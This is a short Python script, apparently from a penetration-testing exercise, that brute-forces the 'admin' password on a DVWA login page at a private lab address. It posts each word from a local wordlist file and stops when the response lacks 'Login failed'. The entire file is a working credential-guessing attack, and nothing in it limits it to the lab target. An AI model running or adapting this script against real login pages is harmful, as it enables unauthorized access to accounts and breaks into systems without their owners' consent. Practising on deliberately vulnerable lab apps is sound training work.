#!/usr/bin/env/python

#how to fill froms using python in a guest account i.e password is not known
import requests

target_url="http://10.0.2.5/dvwa/login.php"

data_d = {"username":"admin","password":"","Login":"submit"}

with open("/root/Desktop/Pyth/form/pass.txt") as wordlists:
    for line in wordlists:
        word=line.strip()
        data_d["password"]=word
        response = requests.post(target_url,data=data_d)
        if "Login failed" not in response.content:
            print("[+] Pasword is "+word)
            exit()